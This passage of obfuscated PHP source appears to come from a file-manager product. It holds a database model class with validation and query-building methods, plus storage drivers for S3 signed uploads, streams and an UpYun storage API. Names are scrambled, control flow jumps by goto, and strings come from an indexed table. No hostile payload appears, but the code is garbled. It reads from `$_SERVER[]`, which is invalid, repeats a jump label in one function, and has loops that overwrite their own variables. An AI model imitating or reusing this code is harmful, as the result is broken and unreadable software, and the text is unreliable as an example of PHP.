$Bˌ) { $A = $Bˌ[$cɃᚷ]; if (2 == $Bڻë) { $E꓇[$A] = $Bˌ[$Fػ]; } else { $E꓇[$A] = is_string($fǪօ) ? implode($fǪօ, $Bˌ) : $Bˌ; } } return $E꓇; goto dÃ; F: $bݼ = explode($c̞ϊ[47], $eҬω); $eҬω = array_keys($bЉ[0]); $cɃᚷ = array_shift($eҬω); goto C艡ۖ; C艡ۖ: $Fػ = array_shift($eҬω); $E꓇ = array(); $Bڻë = count($bݼ); goto Bݎϑ; dÃ: } } else { if (!0 !== $fǪօ) { $c΅[$c̞ϊ[290]] = is_numeric($fǪօ) ? $fǪօ : 1; } if ($fǪօ === $c̞ϊ[253]) { unset($c΅[$c̞ϊ[290]]); } $Bˌ = $this->db->select($c΅); if (!empty($Bˌ)) { if ($fǪօ === $c̞ϊ[253]) { return reset($Bˌ[0]); } if (!0 !== $fǪօ && 1 == $c΅[$c̞ϊ[290]]) { return reset($Bˌ[0]); } foreach ($Bˌ as $eʹ) { $fݰ[] = $eʹ[$eҬω]; } return $fݰ; } } return null; } public function create($b = '', $Aه = '') { goto b㘑; f򨭸: return $b; goto d; f焮: if (isset($c)) { if (is_string($c)) { $c = explode($f[47], $c); } if (think_config($f[296])) { $c[] = think_config($f[297]); } foreach ($b as $b => $E) { if (!in_array($b, $c)) { unset($b[$b]); } } } if (!$this->autoValidation($b, $Aه)) { return !1; } if (!$this->autoCheckToken($b)) { $this->error = think_lang($f[298]); return !1; } goto Dힿ; aҶ: $b = $this->parseFieldsMap($b, 0); $Aه = $Aه ? $Aه : (!empty($b[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$f[271]])) { $c = $this->options[$f[271]]; unset($this->options[$f[271]]); } elseif ($Aه == THINK_MODEL_INSERT && isset($this->insertFields)) { $c = $this->insertFields; } elseif ($Aه == THINK_MODEL_UPDATE && isset($this->updateFields)) { $c = $this->updateFields; } goto f焮; Dힿ: if ($this->autoCheckFields) { $c = $this->getDbFields(); foreach ($b as $b => $E) { if (!in_array($b, $c)) { unset($b[$b]); } elseif (MAGIC_QUOTES_GPC && is_string($E)) { $b[$b] = stripslashes($E); } } } $this->autoOperation($b, $Aه); $this->data = $b; goto f򨭸; b㘑: $f =& $_SERVER[]; if (empty($b)) { $b = $_POST; } elseif (is_object($b)) { $b = get_object_vars($b); } if (empty($b) || !is_array($b)) { $this->error = think_lang($f[269]); return !1; } goto aҶ; d: } public function autoCheckToken($Cեʩ) { $a =& $_SERVER[]; if (isset($this->options[$a[299]]) && !$this->options[$a[299]]) { return !0; } if (think_config($a[296])) { $Bɾ = think_config($a[297]); if (!isset($Cեʩ[$Bɾ]) || Session::get($Bɾ)) { return !1; } list($e٠, $Č) = explode($a[71], $Cեʩ[$Bɾ]); if ($Č && Session::get($Bɾ . $a[95] . $e٠) === $Č) { Session::remove($Bɾ . $a[95] . $e٠); return !0; } if (think_config($a[300])) { Session::remove($Bɾ . $a[95] . $e٠); } return !1; } return !0; } public function regex($a˦, $C) { $Cژ =& $_SERVER[]; $a = array($Cژ[301] => $Cژ[302], $Cژ[303] => $Cژ[304], $Cژ[305] => $Cژ[306], $Cژ[307] => $Cژ[308], $Cژ[309] => $Cژ[310], $Cژ[311] => $Cژ[312], $Cژ[313] => $Cژ[314], $Cژ[288] => $Cژ[315], $Cژ[316] => $Cژ[317]); if (isset($a[strtolower($C)])) { $C = $a[strtolower($C)]; } return preg_match($C, $a˦) === 1; } private function autoOperation(&$f֍, $Dފ) { $c =& $_SERVER[]; if (!empty($this->options[$c[318]])) { $B = $this->options[$c[318]]; unset($this->options[$c[318]]); } elseif (!empty($this->_auto)) { $B = $this->_auto; } if (isset($B)) { foreach ($B as $FƲפ) { if (empty($FƲפ[2])) { $FƲפ[2] = THINK_MODEL_INSERT; } if ($Dފ == $FƲפ[2] || $FƲפ[2] == THINK_MODEL_BOTH) { switch (trim($FƲפ[3])) { case $c[319]: case $c[320]: $b撍λ = isset($FƲפ[4]) ? (array) $FƲפ[4] : array(); if (isset($f֍[$FƲפ[0]])) { array_unshift($b撍λ, $f֍[$FƲפ[0]]); } if ($c[319] == $FƲפ[3]) { $f֍[$FƲפ[0]] = call_user_func_array($FƲפ[1], $b撍λ); } else { $f֍[$FƲפ[0]] = call_user_func_array(array(&$this, $FƲפ[1]), $b撍λ); } break; case $c[271]: $f֍[$FƲפ[0]] = $f֍[$FƲפ[1]]; break; case $c[321]: if ($c[33] === $f֍[$FƲפ[0]]) { unset($f֍[$FƲפ[0]]); } break; case $c[322]: default: $f֍[$FƲפ[0]] = $FƲפ[1]; } if (!1 === $f֍[$FƲפ[0]]) { unset($f֍[$FƲפ[0]]); } } } } return $f֍; } protected function autoValidation($eȄ, $fڝ㮍) { $b =& $_SERVER[]; if (!empty($this->options[$b[323]])) { $bӹ = $this->options[$b[323]]; unset($this->options[$b[323]]); } elseif (!empty($this->_validate)) { $bӹ = $this->_validate; } if (isset($bӹ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bӹ as $Bډ => $BĹ) { if (empty($BĹ[5]) || $BĹ[5] == THINK_MODEL_BOTH || $BĹ[5] == $fڝ㮍) { if (0 == strpos($BĹ[2], $b[324]) && strpos($BĹ[2], $b[325])) { $BĹ[2] = think_lang(substr($BĹ[2], 2, -1)); } $BĹ[3] = isset($BĹ[3]) ? $BĹ[3] : THINK_EXISTS_VALIDATE; $BĹ[4] = isset($BĹ[4]) ? $BĹ[4] : $b[326]; switch ($BĹ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($eȄ, $BĹ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($b[33] != trim($eȄ[$BĹ[0]])) { if (!1 === $this->_validationField($eȄ, $BĹ)) { return !1; } } break; default: if (isset($eȄ[$BĹ[0]])) { if (!1 === $this->_validationField($eȄ, $BĹ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($c, $C˼) { if (!1 === $this->_validationFieldItem($c, $C˼)) { if ($this->patchValidate) { $this->error[$C˼[0]] = $C˼[2]; } else { $this->error = $C˼[2]; return !1; } } return; } protected function _validationFieldItem($b桵, $DŬ) { $e憆 =& $_SERVER[]; switch (strtolower(trim($DŬ[4]))) { case $e憆[319]: case $e憆[320]: $f˨ = isset($DŬ[6]) ? (array) $DŬ[6] : array(); if (is_string($DŬ[0]) && strpos($DŬ[0], $e憆[47])) { $DŬ[0] = explode($e憆[47], $DŬ[0]); } if (is_array($DŬ[0])) { foreach ($DŬ[0] as $C) { $C檾[$C] = $b桵[$C]; } array_unshift($f˨, $C檾); } else { array_unshift($f˨, $b桵[$DŬ[0]]); } if ($e憆[319] == $DŬ[4]) { return call_user_func_array($DŬ[1], $f˨); } else { return call_user_func_array(array(&$this, $DŬ[1]), $f˨); } case $e憆[327]: return $b桵[$DŬ[0]] == $b桵[$DŬ[1]]; case $e憆[328]: if (is_string($DŬ[0]) && strpos($DŬ[0], $e憆[47])) { $DŬ[0] = explode($e憆[47], $DŬ[0]); } $F = array(); if (is_array($DŬ[0])) { foreach ($DŬ[0] as $C) { $F[$C] = $b桵[$C]; } } else { $F[$DŬ[0]] = $b桵[$DŬ[0]]; } if (!empty($b桵[$this->getPk()])) { $F[$this->getPk()] = array($e憆[329], $b桵[$this->getPk()]); } if ($this->where($F)->find()) { return !1; } return !0; default: return $this->check($b桵[$DŬ[0]], $DŬ[1], $DŬ[4]); } } public function check($D㕐, $F̰, $a펷 = "\162\145\147\x65\x78") { $B =& $_SERVER[]; $a펷 = strtolower(trim($a펷)); switch ($a펷) { case $B[7]: case $B[330]: $F᭗ = is_array($F̰) ? $F̰ : explode($B[47], $F̰); return $a펷 == $B[7] ? in_array($D㕐, $F᭗) : !in_array($D㕐, $F᭗); case $B[331]: case $B[332]: if (is_array($F̰)) { $E = $F̰[0]; $Dݠ̴ = $F̰[1]; } else { list($E, $Dݠ̴) = explode($B[47], $F̰); } return $a펷 == $B[331] ? $D㕐 >= $E && $D㕐 <= $Dݠ̴ : $D㕐 < $E || $D㕐 > $Dݠ̴; case $B[333]: case $B[334]: return $a펷 == $B[333] ? $D㕐 == $F̰ : $D㕐 != $F̰; case $B[335]: $Cߣ = mb_strlen($D㕐, $B[336]); if (strpos($F̰, $B[47])) { list($E, $Dݠ̴) = explode($B[47], $F̰); return $Cߣ >= $E && $Cߣ <= $Dݠ̴; } else { return $Cߣ == $F̰; } case $B[337]: list($Fݽݶ, $Fձ؟) = explode($B[47], $F̰); if (!is_numeric($Fݽݶ)) { $Fݽݶ = strtotime($Fݽݶ); } if (!is_numeric($Fձ؟)) { $Fձ؟ = strtotime($Fձ؟); } return NOW_TIME >= $Fݽݶ && NOW_TIME <= $Fձ؟; case $B[338]: return in_array(get_client_ip(), explode($B[47], $F̰)); case $B[339]: return !in_array(get_client_ip(), explode($B[47], $F̰)); case $B[326]: default: return $this->regex($D㕐, $F̰); } } public function query($b, $eŢ = false) { $c̮ =& $_SERVER[]; if (!is_bool($eŢ) && !is_array($eŢ)) { $eŢ = func_get_args(); array_shift($eŢ); } $b = str_replace(array($c̮[229], $c̮[340]), $c̮[50], $b); $b = $this->parseSql($b, $eŢ); return $this->db->query($b); } public function execute($d, $c = false) { if (!is_bool($c) && !is_array($c)) { $c = func_get_args(); array_shift($c); } $d = $this->parseSql($d, $c); return $this->db->execute($d); } protected function parseSql($b҂ߌ, $bկх) { $B =& $_SERVER[]; if (!0 === $bկх) { $bТ = $this->_parseOptions(); $b҂ߌ = $this->db->parseSql($b҂ߌ, $bТ); } elseif (is_array($bկх)) { $bկх = array_map(array($this->db, $B[341]), $bկх); $b҂ߌ = vsprintf($b҂ߌ, $bկх); } else { $b҂ߌ = strtr($b҂ߌ, array($B[342] => $this->getTableName(), $B[343] => think_config($B[242]))); } $this->db->setModel($this->name); return $b҂ߌ; } public function db($c = '', $c鎼 = '', $D׍ = array()) { goto B҂Î; B҂Î: $Cۺ =& $_SERVER[]; if ($Cۺ[33] === $c && $this->db) { return $this->db; } static $C = array(); goto fǵ; F: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto D; fǵ: static $aߖ = array(); if (!isset($aߖ[$c]) || isset($aߖ[$c]) && $c鎼 && $C[$c] != $c鎼) { if (!empty($c鎼) && is_string($c鎼) && !1 === strpos($c鎼, $Cۺ[8])) { $c鎼 = think_config($c鎼); } $aߖ[$c] = Db::getInstance($c鎼); } elseif (NULL === $c鎼) { $aߖ[$c]->close(); unset($aߖ[$c]); return; } if (!empty($D׍)) { if (is_string($D׍)) { parse_str($D׍, $D׍); } foreach ($D׍ as $dǃŞ => $C) { $this->setProperty($dǃŞ, $C); } } goto Dݲ; Dݲ: $C[$c] = $c鎼; $this->db = $aߖ[$c]; $this->_after_db(); goto F; D: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $DΉ = get_class($this); if ($DΉ == $_SERVER[][344]) { return $this->name; } $this->name = substr($DΉ, 0, -5); } return $this->name; } public function getTableName() { $fǊԵ =& $_SERVER[]; if (empty($this->trueTableName)) { $aɂް = !empty($this->tablePrefix) ? $this->tablePrefix : $fǊԵ[33]; if (!empty($this->tableName)) { $aɂް .= $this->tableName; } else { $aɂް .= think_parse_name($this->name); } $this->trueTableName = strtolower($aɂް); } return (!empty($this->dbName) ? $this->dbName . $fǊԵ[95] : $fǊԵ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eﲳߑ =& $_SERVER[]; return isset($this->fields[$eﲳߑ[249]]) ? $this->fields[$eﲳߑ[249]] : $this->pk; } public function getDbFields() { $aȳ =& $_SERVER[]; if (isset($this->options[$aȳ[277]])) { $eѦ = $this->db->getFields($this->options[$aȳ[277]]); return $eѦ ? array_keys($eѦ) : !1; } if ($this->fields) { $eѦ = $this->fields; unset($eѦ[$aȳ[248]], $eѦ[$aȳ[249]], $eѦ[$aȳ[250]], $eѦ[$aȳ[247]]); return $eѦ; } return !1; } public function data($BщȜ = '') { $BͷԿ =& $_SERVER[]; if ($BͷԿ[33] === $BщȜ && !empty($this->data)) { return $this->data; } if (is_object($BщȜ)) { $BщȜ = get_object_vars($BщȜ); } elseif (is_string($BщȜ)) { parse_str($BщȜ, $BщȜ); } elseif (!is_array($BщȜ)) { think_exception(think_lang($BͷԿ[269])); } $this->data = $BщȜ; return $this; } public function join($eⵋ) { $C׉ =& $_SERVER[]; if (is_array($eⵋ)) { $this->options[$C׉[280]] = $eⵋ; } elseif (!empty($eⵋ)) { $this->options[$C׉[280]][] = $eⵋ; } return $this; } public function union($D, $Aק = false) { goto Fۃ; F̧: if (is_object($D)) { $D = get_object_vars($D); } if (is_string($D)) { $FÌ֓ = $D; } elseif (is_array($D)) { if (isset($D[0])) { $this->options[$dܘ[345]] = array_merge($this->options[$dܘ[345]], $D); return $this; } else { $FÌ֓ = $D; } } else { think_exception(think_lang($dܘ[269])); } $this->options[$dܘ[345]][] = $FÌ֓; goto AˇÊ; AˇÊ: return $this; goto E蛺; Fۃ: $dܘ =& $_SERVER[]; if (empty($D)) { return $this; } if ($Aק) { $this->options[$dܘ[345]][$dܘ[346]] = !0; } goto F̧; E蛺: } public function cache($Bཎ = true, $d鰠݄ = null, $A޹ = '') { $FǴ =& $_SERVER[]; if (!1 !== $Bཎ) { $this->options[$FǴ[347]] = array($FǴ[93] => $Bཎ, $FǴ[337] => $d鰠݄, $FǴ[29] => $A޹); } return $this; } public function field($aӑߌ, $B퍛 = false) { $e֠Ǒ =& $_SERVER[]; if (!0 === $aӑߌ) { $DՅ = $this->getDbFields(); $aӑߌ = $DՅ ? $DՅ : $e֠Ǒ[182]; } elseif ($B퍛) { if (is_string($aӑߌ)) { $aӑߌ = explode($e֠Ǒ[47], $aӑߌ); } $DՅ = $this->getDbFields(); $aӑߌ = $DՅ ? array_diff($DՅ, $aӑߌ) : $aӑߌ; } $this->options[$e֠Ǒ[271]] = $aӑߌ; return $this; } public function scope($dܞۇѕ = '', $FǮǂ = NULL) { $a =& $_SERVER[]; if ($a[33] === $dܞۇѕ) { if (isset($this->_scope[$a[34]])) { $bʄ = $this->_scope[$a[34]]; } else { return $this; } } elseif (is_string($dܞۇѕ)) { $a = explode($a[47], $dܞۇѕ); $bʄ = array(); foreach ($a as $b) { if (!isset($this->_scope[$b])) { continue; } $bʄ = array_merge($bʄ, $this->_scope[$b]); } if (!empty($FǮǂ) && is_array($FǮǂ)) { $bʄ = array_merge($bʄ, $FǮǂ); } } elseif (is_array($dܞۇѕ)) { $bʄ = $dܞۇѕ; } if (is_array($bʄ) && !empty($bʄ)) { $this->options = array_merge($this->options, array_change_key_case($bʄ)); } return $this; } public function where($dɾ, $f؇䠨 = null) { $DÞ =& $_SERVER[]; if (!is_null($f؇䠨) && is_string($dɾ)) { if (!is_array($f؇䠨)) { $f؇䠨 = func_get_args(); array_shift($f؇䠨); } $f؇䠨 = array_map(array($this->db, $DÞ[341]), $f؇䠨); $dɾ = vsprintf($dɾ, $f؇䠨); } elseif (is_object($dɾ)) { $dɾ = get_object_vars($dɾ); } elseif (is_array($dɾ)) { foreach ($dɾ as $Fڏ => $dᥐ) { if ((is_numeric($Fڏ) || !$Fڏ) && is_string($dᥐ)) { if (strpos($dᥐ, $DÞ[348]) === 0) { continue; } think_trace($DÞ[349], $DÞ[33], $DÞ[46]); die; } } } if (is_string($dɾ) && $DÞ[33] != $dɾ) { $c = array(); $c[$DÞ[350]] = $dɾ; $dɾ = $c; } if (isset($this->options[$DÞ[273]])) { $this->options[$DÞ[273]] = array_merge($this->options[$DÞ[273]], $dɾ); } else { $this->options[$DÞ[273]] = $dɾ; } return $this; } public function limit($bରٚ, $aű = null) { $c֭ =& $_SERVER[]; $this->options[$c֭[290]] = is_null($aű) ? $bରٚ : $bରٚ . $c֭[47] . $aű; return $this; } public function page($dډ, $Cݢ = null) { $c =& $_SERVER[]; $this->options[$c[351]] = is_null($Cݢ) ? $dډ : $dډ . $c[47] . $Cݢ; return $this; } public function comment($a𩟒ʢ) { $this->options[$_SERVER[][352]] = $a𩟒ʢ; return $this; } public function setProperty($d튌, $B瑉) { if (property_exists($this, $d튌)) { $this->{$d튌} = $B瑉; } return $this; } } goto fդ; cſ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D) { parent::__construct($D); } public function uploadFormData($D⽲ڽ, $Cʯٕ = 3600) { goto Cޙ; AЃ: $dͶ = $F[59]; $a؂ = gmdate($F[1232]); $CԌ = gmdate($F[717]); goto aś; aś: $dˢ = $F[1233]; $D͊캻 = $Cʯٕ . $F[33]; $AН = $F[1196]; goto Bǭ; Cޙ: $F =& $_SERVER[]; $F = $F[192]; $aʿ驰 = $F[1231]; goto AЃ; Bǭ: $EӃ = array($this->accessKey, $CԌ, $this->region, $dͶ, $dˢ); $d𘐶 = implode($F[8], $EӃ); $Eܿ頪 = array($F[1198] => gmdate($F[1197], strtotime($F[1234])), $F[1199] => array(array($F[1201] => $this->bucket), array($F[1200] => $F), array($F[1202], $F[1203], $F[33]), array($F[1202], $F[1235], $F[33]), array($F[1202], $F[1236], $F[33]), array($F[1204] => $AН), array($F[1237] => $d𘐶), array($F[1238] => $aʿ驰), array($F[1239] => $a؂), array($F[1240] => $D͊캻))); goto aر; aر: $E﮶ź = base64_encode(json_encode($Eܿ頪)); $Eֳ = hash_hmac($F[1241], $CԌ, $F[1242] . $this->secret, !0); $aƸ鑴 = hash_hmac($F[1241], $this->region, $Eֳ, !0); goto B; B: $cݮ = array($F[211] => $F[33], $F[1243] => $F[33], $F[1200] => $F, $F[1204] => $AН, $F[1208] => $E﮶ź, $F[1244] => $d𘐶, $F[1245] => $aʿ驰, $F[1246] => $a؂, $F[1247] => $D͊캻, $F[1248] => $AЯ, $F[175] => $this->getHost()); return $cݮ; goto EƊ; B: $C = hash_hmac($F[1241], $dͶ, $aƸ鑴, !0); $aʃ = hash_hmac($F[1241], $dˢ, $C, !0); $AЯ = hash_hmac($F[1241], $E﮶ź, $aʃ); goto B; EƊ: } public function multiUploadFormData($Eʼ, $Aū = 3600) { $CόƷ =& $_SERVER[]; $f = gmdate($CόƷ[1326]); $f୳ = array(); $fܰ = $this->client->getUploadId($this->bucket, $Eʼ, $f୳); if (!$fܰ) { return !1; } return array($CόƷ[221] => $fܰ, $CόƷ[175] => $this->getHost() . $CόƷ[8] . $this->pathEncode($Eʼ), $CόƷ[222] => $f, $CόƷ[93] => $Eʼ); } public function multiUploadAuthData($C, $a۷ = array()) { goto a񝯺; a񝯺: $FΨۇ =& $_SERVER[]; $dӨꗾ = isset($a۷[$FΨۇ[168]]) ? $a۷[$FΨۇ[168]] : $FΨۇ[33]; $D = $a۷[$FΨۇ[93]]; goto CԄ; dݩɲ: if (isset($a۷[$FΨۇ[1327]])) { $a쫕[$FΨۇ[1328]] = $a۷[$FΨۇ[1327]]; } $d،ˉխ = explode($FΨۇ[177], $this->getHost()); $b㮲 = array($FΨۇ[1329] => $d،ˉխ[1], $FΨۇ[1330] => $FΨۇ[33], $FΨۇ[211] => $FΨۇ[119], $FΨۇ[1243] => $a۷[$FΨۇ[78]]); goto C폫۽ä; C폫۽ä: $D = $FΨۇ[226]; $b˭ = $FΨۇ[8] . $this->pathEncode($D) . $dӨꗾ; $Dј = $this->client->__getSignatureV4($a쫕, $b㮲, $D, $b˭); goto DҖ; DҖ: if (strpos($dӨꗾ, $FΨۇ[225]) === 0) { if (isset($a쫕[$FΨۇ[1328]])) { $B΅ = $a쫕[$FΨۇ[1328]]; } else { if (isset($Dј[$FΨۇ[1328]])) { $B΅ = $Dј[$FΨۇ[1328]]; } else { $B΅ = hash($FΨۇ[1241], $FΨۇ[33]); } } return array($FΨۇ[232] => $Dј[$FΨۇ[232]], $FΨۇ[1328] => $B΅, $FΨۇ[222] => $Dј[$FΨۇ[1331]]); } return $Dј[$FΨۇ[232]]; goto C; CԄ: unset($a۷[$FΨۇ[93]]); if (isset($a۷[$FΨۇ[223]])) { return $this->listUploadParts($D, $a۷); } $a쫕 = array(); goto dݩɲ; C: } public function listUploadParts($aл, $B읍 = array()) { goto BͰ; A˶: $A .= $dޏ[1335]; $B틱 = array(); $B݉ = explode($dޏ[177], $this->getHost()); goto Aƭ; D: if (!$F) { return !1; } $A = $dޏ[1332]; foreach ($F as $f) { $A .= $dޏ[1333] . "\x3c\120\x61\162\x74\116\x75\x6d\x62\145\x72\76{$f[$dޏ[1288]]}\74\x2f\120\x61\162\x74\x4e\165\155\142\145\162\76\12" . "\74\105\x54\141\x67\x3e{$f[$dޏ[1289]]}\74\x2f\x45\124\x61\x67\x3e\xa" . $dޏ[1334]; } goto A˶; BͰ: $dޏ =& $_SERVER[]; $bǊ = str_replace($dޏ[233], $dޏ[33], $B읍[$dޏ[168]]); $F = $this->client->listParts($this->bucket, $aл, $bǊ); goto D; e랆: $Aꈉ = $this->client->__getSignatureV4($B틱, $cߔ, $B, $aе, $A); return array($dޏ[232] => $Aꈉ[$dޏ[232]], $dޏ[222] => $Aꈉ[$dޏ[1331]], $dޏ[234] => $F, $dޏ[1328] => $Aꈉ[$dޏ[1328]]); goto Dه; Aƭ: $cߔ = array($dޏ[1329] => $B݉[1], $dޏ[211] => $dޏ[119], $dޏ[1243] => strlen($A)); $B = $dޏ[224]; $aе = $dޏ[8] . $this->pathEncode($aл) . $B읍[$dޏ[168]]; goto e랆; Dه: } public function link($EՉ, $EŞ = array()) { return parent::link($EՉ, $EŞ); } public function fileOut($A뢉, $fނ = false, $bח = false, $c = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1336])) { return parent::fileOutServer($A뢉, $fނ, $bח, $c); } parent::fileOut($A뢉, $fނ, $bח, $c); } public function fileOutImage($B, $C = 250) { if (strstr($this->endpoint, $_SERVER[][1336])) { return parent::fileOutImageServer($B, $C); } parent::fileOutImage($B, $C); } public function fileOutLink($Fސ) { $a扑 =& $_SERVER[]; if (substr($Fސ, 0, 7) == $a扑[1211]) { $Fސ = $a扑[1212] . substr($Fސ, 7); } header($a扑[159] . $Fސ); die; } public function getHost() { $Eڟ =& $_SERVER[]; $D = str_rtrim(parent::getHost(), $Eڟ[8] . $this->bucket); $D = explode($Eڟ[177], $D); return $D[0] . $Eڟ[177] . $this->bucket . $Eڟ[95] . $D[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eت, $A = 0) { parent::__construct(); $this->source = $eت; $this->sourceSize = $A; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Cػ = false) { return $this->sourceSize; } public function getContent($a = false) { return $this->fileSubstr($a, 0, $this->sourceSize); } public function fileSubstr($AŸ = false, $F໾ = 0, $cޫۗ = 0) { if (!$cޫۗ) { $cޫۗ = $this->sourceSize; } $cƯ҂ = $this->sourceSize - $F໾; if ($cޫۗ >= $cƯ҂) { $cޫۗ = $cƯ҂; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F໾, $cޫۗ); } if ($this->sourceType == self::TYPE_FILE) { if ($cޫۗ <= 0) { return $_SERVER[][33]; } $F؇ʟǷ = ftell($this->source); fseek_64($this->source, $F؇ʟǷ + $F໾); $bĦ = @fread($this->source, $cޫۗ); fseek_64($this->source, $F؇ʟǷ); return $bĦ; } } public function hashMd5($A޳ = false) { return md5($this->getContent()); } public static function hash($B᭜, $b籢 = 0) { $f۔ = new PathDriverStream($B᭜, $b籢); return $f۔->hashSimple($B᭜); } public static function md5($f, $bŧʒ = 0) { $BҪՖ = new PathDriverStream($f, $bŧʒ); return $BҪՖ->hashMd5($f); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\72\57\x2f\x76\x30\56\141\x70\x69\x2e\165\x70\171\x75\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e) { parent::__construct(); $this->_init($e); } public function _init($Bѐ) { $AĐ =& $_SERVER[]; foreach ($Bѐ as $e£ => $a) { if (isset($this->{$e£})) { $this->{$e£} = $a; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($AĐ[1337] . LNG($AĐ[1269])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($F쎑Ӌ, $dא = "\x47\105\x54") { $a򅌚 =& $_SERVER[]; $f۷ = gmdate($a򅌚[1303]); $fͷ = base64_encode(hash_hmac($a򅌚[1338], "{$dא}\x26{$F쎑Ӌ}\x26{$f۷}", md5("{$this->userpass}"), !0)); $e = array("\101\165\164\x68\157\162\151\x7a\141\164\x69\157\156\x3a\125\120\131\x55\x4e\40{$this->username}\72{$fͷ}", "\x44\x61\x74\145\72{$f۷}"); return $e; } public function ussRequest($e۵鞌, $F됰 = "\107\105\124", $CƝܣ = false, $cƬ = false, $f򃂋 = false) { goto Eа; Eа: $e =& $_SERVER[]; $e۵鞌 = trim($e۵鞌, $e[8]); $f = "\57{$this->bucket}\57{$e۵鞌}"; goto dɤ; C˦: if (!$E) { return array($e[1093] => !1, $e[1095] => $e[1339]); } if (strtolower($F됰) == $e[190] || in_array($E[$e[1093]], array($e[1196], $e[1340]))) { $CƝܣ = $E[$e[1341]]; } else { $CƝܣ = json_decode($E[$e[1095]], !0); if (!$CƝܣ) { $CƝܣ = $E[$e[1095]]; } else { if (!$E[$e[716]] && isset($CƝܣ[$e[1342]])) { $CƝܣ = $CƝܣ[$e[1342]]; } } } return array($e[1093] => $E[$e[716]], $e[1095] => $CƝܣ); goto dͩ; dɤ: $F = $this->ussHeaders($f, $F됰); if ($cƬ) { $F = array_merge($F, $cƬ); } $E = url_request($this->endpoint . $f, $F됰, $CƝܣ, $F, $f򃂋); goto C˦; dͩ: } public function mkfile($B, $D = '', $Cޒ = REPEAT_RENAME) { if ($this->setContent($B, $D)) { return $this->getPathOuter($B); } return !1; } public function mkdir($eݜ͛, $f = REPEAT_SKIP) { $A΍ =& $_SERVER[]; $A՝ = trim($eݜ͛, $A΍[8]); if ($this->_isFolder($A՝)) { return $this->getPathOuter($A՝); } $b = array($A΍[1343]); $F = $this->ussRequest($A՝, $A΍[224], !1, $b); return $F[$A΍[1093]] ? $this->getPathOuter($A՝) : !1; } public function copyFile($B嘥, $dӺ) { $fߤ =& $_SERVER[]; $f뱣 = array($fߤ[1344] . "\57{$this->bucket}\57{$B嘥}", $fߤ[1345]); $E = $this->ussRequest($dӺ, $fߤ[226], !1, $f뱣); return $E[$fߤ[1093]] ? !0 : $this->getPathOuter($dӺ); } public function moveFile($C΢, $Dŉ) { $bݴ =& $_SERVER[]; $F = array($bݴ[1346] . "\57{$this->bucket}\57{$C΢}", $bݴ[1345]); $D톏 = $this->ussRequest($Dŉ, $bݴ[226], !1, $F); return $D톏[$bݴ[1093]] ? !0 : $this->getPathOuter($Dŉ); } public function delFile($F) { $Dʍ =& $_SERVER[]; $a݅ = $this->ussRequest($F, $Dʍ[1347]); return $a݅[$Dʍ[1093]] ? !0 : !1; } public function delFolder($e拊) { goto C; C: $E =& $_SERVER[]; if (!$this->exist($e拊)) { return !0; } $this->listItemCache = !1; goto aÿ; e襟: return $bӤ[$E[1093]]; goto Cܤۭ; aÿ: $Aគ = $Eқū = array(); $this->fileList($e拊, $Aគ, $Eқū, !0); $this->listItemCache = !0; goto A֒; A֒: foreach ($Eқū as $F₊) { $bӤ = $this->ussRequest($F₊[$E[28]], $E[1347]); if (!$bӤ[$E[1093]]) { return !1; } } foreach ($Aគ as $AߐՃ) { $bӤ = $this->ussRequest($AߐՃ, $E[1347]); if (!$bӤ[$E[1093]]) { return !1; } } $bӤ = $this->ussRequest($e拊, $E[1347]); goto e襟; Cܤۭ: } public function rename($f͍ҍ, $Cޝ) { if ($this->isFile($f͍ҍ)) { $Cޝ = get_path_father($f͍ҍ) . $Cޝ; return $this->moveFile($f͍ҍ, $Cޝ); } return $this->renameObject($f͍ҍ, $Cޝ); } public function fileInfo($fպ, $a쬊Ѯ = false, $f뽾 = array()) { goto aٴ; E: return $eĩ; goto Bɉ; f۝: $eĩ[$DՑ[194]] = intval($f뽾[$DՑ[1348]]); $eĩ[$DՑ[84]] = intval($f뽾[$DՑ[1349]]); $eĩ[$DՑ[78]] = $f뽾[$DՑ[78]]; goto E; aٴ: $DՑ =& $_SERVER[]; $eĩ = array($DՑ[28] => $this->pathThis($fպ), $DՑ[76] => $this->getPathOuter($DՑ[8] . $fպ), $DՑ[29] => $DՑ[193], $DՑ[78] => isset($f뽾[$DՑ[78]]) ? $f뽾[$DՑ[78]] : 0, $DՑ[168] => $this->ext($fպ)); if ($a쬊Ѯ) { return $eĩ; } goto A҅; A҅: $eĩ[$DՑ[194]] = $eĩ[$DՑ[84]] = 0; $eĩ[$DՑ[195]] = $eĩ[$DՑ[196]] = !0; if (empty($f뽾)) { $f뽾 = $this->objectMeta($fպ); if (!$f뽾) { return $eĩ; } } goto f۝; Bɉ: } public function folderInfo($B, $Dѵ傊 = false) { goto f; bݱ: $F[$Fֽ[194]] = intval($bܼ[$Fֽ[1348]]); $F[$Fֽ[84]] = intval($bܼ[$Fֽ[1349]]); return $F; goto b樽; e؇: $F[$Fֽ[194]] = $F[$Fֽ[84]] = 0; $F[$Fֽ[195]] = 